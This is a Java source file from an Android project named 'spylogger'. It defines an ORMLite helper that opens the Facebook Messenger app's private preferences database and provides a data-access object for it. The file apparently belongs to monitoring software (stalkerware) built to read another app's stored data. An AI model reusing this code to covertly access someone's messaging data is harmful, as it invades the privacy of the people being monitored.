package com.gravatasufoca.spylogger.dao.messenger;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.model.messenger.Prefs;
import com.gravatasufoca.spylogger.R;
import com.j256.ormlite.android.apptools.OrmLiteSqliteOpenHelper;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.support.ConnectionSource;
import com.j256.ormlite.table.TableUtils;

import java.sql.SQLException;

/**
 * Database helper which creates and upgrades the database and provides the DAOs for the app.
 *
 * @author bruno
 */
public class DatabaseHelperFacebookPrefs extends OrmLiteSqliteOpenHelper {

	/************************************************
	 * Suggested Copy/Paste code. Everything from here to the done block.
	 ************************************************/

	private static final String DATABASE_NAME = Utils.FACEBOOK_DIR_PATH +"/databases/prefs_db";
	private static final int DATABASE_VERSION = 1;
	private Dao<Prefs, Integer> prefsDao;
	public static Context context;
	public DatabaseHelperFacebookPrefs(Context context) {
		super(context, DATABASE_NAME, null, DATABASE_VERSION, R.raw.ormlite_config);
		DatabaseHelperFacebookPrefs.context=context;
	}

	/************************************************
	 * Suggested Copy/Paste Done
	 ************************************************/

	@Override
	public void onCreate(SQLiteDatabase sqliteDatabase, ConnectionSource connectionSource) {
		try {
			TableUtils.createTableIfNotExists(connectionSource, Prefs.class);

		} catch (SQLException e) {
			Log.e(DatabaseHelperFacebookPrefs.class.getName(), "Unable to create datbases", e);
		}
	}

	@Override
	public void onUpgrade(SQLiteDatabase arg0, ConnectionSource arg1, int arg2,
			int arg3) {
	}

	@Override
	public void onDowngrade(SQLiteDatabase db, int oldVersion, int newVersion) {
	}

	public Dao<Prefs, Integer> getPrefsDao() throws SQLException {
		if (prefsDao == null) {
			prefsDao = getDao(Prefs.class);
		}
		return prefsDao;
	}

}
